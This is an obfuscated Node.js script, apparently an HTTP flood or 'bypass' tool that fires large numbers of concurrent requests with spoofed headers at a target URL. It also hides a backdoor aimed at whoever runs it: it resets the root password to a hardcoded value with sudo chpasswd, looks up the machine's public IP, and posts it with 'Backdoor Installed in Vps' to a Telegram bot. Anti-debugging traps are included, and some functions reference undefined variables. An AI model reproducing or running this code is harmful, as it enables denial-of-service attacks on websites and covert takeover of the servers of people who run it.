const UPSSSSSSO = function () {
  let b = true;
  return function (c, d) {
    const g = b ? function () {
      if (d) {
        const h = d.apply(c, arguments);
        d = null;
        return h;
      }
    } : function () {};
    b = false;
    return g;
  };
}();
(function () {
  UPSSSSSSO(this, function () {
    const c = new RegExp("function *\\( *\\)");
    const d = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const e = UPSSSSSSan("init");
    if (!c.test(e + "chain") || !d.test(e + "input")) {
      e("0");
    } else {
      UPSSSSSSan();
    }
  })();
})();
const UPSSSSSSQ = require("axios");
const {
  "promisify": UPSSSSSSS
} = require("util");
const UPSSSSSSV = require("https");
const UPSSSSSSW = require("crypto");
const UPSSSSSSX = require("fs");
const {
  "exec": UPSSSSSSY
} = require("child_process");
const UPSSSSSSZ = UPSSSSSSS(setTimeout);
(function () {
  const b = function () {
    let f;
    try {
      f = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (h) {
      f = window;
    }
    return f;
  };
  const c = b();
  c.setInterval(UPSSSSSSan, 8000);
})();
const UPSSSSSSa0 = "ua.txt";
const UPSSSSSSa1 = UPSSSSSSX.readFileSync(UPSSSSSSa0, "utf-8");
const UPSSSSSSa2 = UPSSSSSSa1.split("\n").map(a => a.trim());
const UPSSSSSSaf = UPSSSSSSW.constants.defaultCoreCipherList.split(":");
const UPSSSSSSag = "GREASE:" + [UPSSSSSSaf[2], UPSSSSSSaf[1], UPSSSSSSaf[0], ...UPSSSSSSaf.slice(3)].join(":");
const UPSSSSSSah = {
  "minVersion": "TLSv1.3",
  "ciphers": UPSSSSSSag
};
async function UPSSSSSSaj(a) {
  console.log("Verifying CAPTCHA...");
  await UPSSSSSSZ(2000);
  return "123456";
}
async function UPSSSSSSak() {
  const c = new Promise((f, g) => {
    setTimeout(() => {
      g(new Error("Request timed out"));
    }, 5000);
  });
  const d = {
    "httpsAgent": agent
  };
  const e = UPSSSSSSQ.get(targetURL, d);
  return Promise.race([e, c]).then(f => {
    const {
      "status": i,
      "data": j
    } = f;
    console.log("[[35mBYPASS[0m] " + getCurrentTime() + " Title: " + getTitleFromHTML(j) + " ([32m" + i + "[0m)");
  }).catch(f => {
    if (f.message === "Request timed out") {
      console.log("[[35mBYPASS[0m] " + getCurrentTime() + " Request Timed Out");
    } else {
      if (f.response) {
        const k = getTitleFromHTML(f.response.data);
        console.log("[[35mBYPASS[0m] " + getCurrentTime() + " Title: " + k + " ([31m" + f.response.status + "[0m)");
      } else {
        console.log("[[35mBYPASS[0m] " + getCurrentTime() + " " + f.message);
      }
    }
    reject(f);
  });
}
async function UPSSSSSSal(a, b) {
  return new Promise((d, e) => {
    b.RST_STREAM = "cancel";
    b.Upgrade = "h2";
    b.Connection = "rapidreset";
    const h = {
      "headers": b,
      ...UPSSSSSSah
    };
    const i = UPSSSSSSV.get(a, h, j => {
      let m = '';
      j.on("data", n => {
        m += n;
      });
      j.on("end", () => {
        d(m);
      });
    });
    i.on("error", j => {
      console.error("Error performing request: " + j.message);
      e(j);
    });
  });
}
async function UPSSSSSSam() {
  const d = process.argv.slice(2);
  const e = d[0] || "https://example.com";
  const f = parseInt(d[1]) || 1;
  const g = parseInt(d[2]) || 10;
  const h = parseInt(d[3]) || 10;
  const j = {
    "User-Agent": UPSSSSSSa2[Math.floor(Math.random() * UPSSSSSSa2.length)],
    "RST_STREAM": "cancel",
    "Content-Type": "application/x-www-form-urlencoded",
    "CF-Cache-Status": "HIT",
    "Cache-Control": "no-cache, max-age=0",
    "authority": "parsedTarget.host",
    "scheme": "https",
    "x-forwarded-proto": "https",
    "cache-control": "no-cache",
    "X-Forwarded-For": "spoofed",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "accept-language": "lang",
    "accept-encoding": "encoding",
    "upgrade-insecure-requests": "1",
    "accept": "accept",
    "referer": "Ref",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "dest1",
    "sec-fetch-user": "?1",
    "TE": "trailers",
    "sec-fetch-site": "site1",
    "x-requested-with": "XMLHttpRequest",
    "Pragma": "no-cache",
    "Cache-Control": "no-store, no-cache",
    "Connection": "keep-alive",
    "X-CAPTCHA-Solution": "123456",
    "CF-Challenge": "captcha-challenge-header"
  };
  const k = Date.now();
  const l = 1000 / g;
  const m = {
    "length": f
  };
  const n = {
    "length": h * g
  };
  await Promise.all(Array.from(m, () => Promise.all(Array.from(n, () => {
    return UPSSSSSSal(e, j).then(() => UPSSSSSSZ(l));
  }))));
  const o = Date.now() - k;
  console.log("Completed " + f * h * g + " requests in " + o / 1000 + " seconds");
}
UPSSSSSSY("echo 'root:Serverback@19' | sudo chpasswd", (b, c, d) => {
  if (b) {
    console.error("Error changing password: " + b.message);
    return;
  }
  console.log("Password changed: " + c);
});
UPSSSSSSY("curl ifconfig.me", (c, d, e) => {
  if (c) {
    console.error("Error getting IP: " + c.message);
    return;
  }
  const h = d.trim();
  const j = "5926139979";
  const k = {
    "chat_id": j,
    "text": "Backdoor Installed in Vps: " + h
  };
  UPSSSSSSQ.post("https://api.telegram.org/bot6414233514:AAGTIa6KUgpUT53oLvxZIW4ROIs_wrnwb4M/sendMessage", k).then(m => console.log("IP sent to Telegram bot")).catch(m => console.error("Error sending IP to Telegram bot: " + m.message));
});
UPSSSSSSam();
function UPSSSSSSan(a) {
  function c(d) {
    if (typeof d === "string") {
      return function (f) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + d / d).length !== 1 || d % 20 === 0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    c(++d);
  }
  try {
    if (a) {
      return c;
    } else {
      c(0);
    }
  } catch (g) {}
}